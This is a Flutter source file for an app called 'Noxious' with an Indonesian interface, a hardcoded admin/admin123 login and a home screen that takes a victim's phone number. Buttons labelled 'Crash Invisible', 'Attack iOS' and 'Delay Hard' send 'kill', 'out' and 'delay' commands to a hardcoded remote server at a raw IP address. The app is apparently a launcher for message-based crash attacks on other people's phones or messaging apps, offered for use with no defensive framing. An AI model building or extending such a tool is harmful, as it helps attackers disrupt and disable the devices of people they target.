import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';

void main() => runApp(const NoxiousApp());

class NoxiousApp extends StatelessWidget {
  const NoxiousApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Noxious',
      theme: ThemeData.dark().copyWith(
        scaffoldBackgroundColor: Colors.black,
        inputDecorationTheme: InputDecorationTheme(
          filled: true,
          fillColor: Colors.grey[900],
          labelStyle: const TextStyle(color: Colors.white70),
          border: OutlineInputBorder(borderRadius: BorderRadius.circular(10)),
        ),
      ),
      home: const LoginPage(),
    );
  }
}

class LoginPage extends StatefulWidget {
  const LoginPage({super.key});

  @override
  State<LoginPage> createState() => _LoginPageState();
}

class _LoginPageState extends State<LoginPage> {
  final usernameController = TextEditingController();
  final passwordController = TextEditingController();
  String error = '';

  void login() {
    final username = usernameController.text.trim();
    final password = passwordController.text.trim();

    if (username == 'admin' && password == 'admin123') {
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (_) => const HomePage()),
      );
    } else {
      setState(() {
        error = 'Username atau password salah!';
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(32),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              const Text(
                'Login ke Noxious',
                style: TextStyle(fontSize: 22),
              ),
              const SizedBox(height: 20),
              TextField(
                controller: usernameController,
                decoration: const InputDecoration(labelText: 'Username'),
              ),
              const SizedBox(height: 10),
              TextField(
                controller: passwordController,
                decoration: const InputDecoration(labelText: 'Password'),
                obscureText: true,
              ),
              const SizedBox(height: 20),
              ElevatedButton(
                onPressed: login,
                child: const Text('Masuk'),
              ),
              const SizedBox(height: 12),
              Text(error, style: const TextStyle(color: Colors.red)),
            ],
          ),
        ),
      ),
    );
  }
}

class HomePage extends StatefulWidget {
  const HomePage({super.key});

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> {
  final numberController = TextEditingController();
  String status = '';
  List<String> log = [];

  Future<void> sendCommand(String command) async {
    final number = numberController.text.trim();
    if (number.isEmpty) {
      setState(() {
        status = 'Nomor kosong!';
        log.add(status);
      });
      return;
    }

    final response = await http.post(
      Uri.parse('http://167.172.76.124:3000/send-message'),
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({'number': number, 'message': command}),
    );

    if (response.statusCode == 200) {
      final data = jsonDecode(response.body);
      setState(() {
        status = '✅ ${data['status']}: ${data['msg']}';
        log.add(status);
      });
    } else {
      setState(() {
        status = '❌ Gagal (${response.statusCode})';
        log.add(status);
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Image.network(
              'https://cdn-icons-png.flaticon.com/512/616/616408.png',
              width: 28,
              height: 28,
            ),
            const SizedBox(width: 10),
            const Text('Noxious'),
          ],
        ),
        centerTitle: true,
        backgroundColor: Colors.transparent,
      ),
      body: Padding(
        padding: const EdgeInsets.all(24.0),
        child: Column(
          children: [
            TextField(
              controller: numberController,
              decoration: const InputDecoration(
                labelText: 'Nomor Tujuan (cth: 628xxxxxx)',
              ),
              keyboardType: TextInputType.phone,
            ),
            const SizedBox(height: 24),
            ElevatedButton(
              onPressed: () => sendCommand('kill'),
              child: const Text('🛑 Crash Invisible'),
            ),
            const SizedBox(height: 12),
            ElevatedButton(
              onPressed: () => sendCommand('out'),
              child: const Text('📱 Attack iOS'),
            ),
            const SizedBox(height: 12),
            ElevatedButton(
              onPressed: () => sendCommand('delay'),
              child: const Text('🐌 Delay Hard'),
            ),
            const SizedBox(height: 24),
            Text(status),
            const SizedBox(height: 24),
            Expanded(
              child: SingleChildScrollView(
                reverse: true,
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: log.map((entry) => Text(entry)).toList(),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}
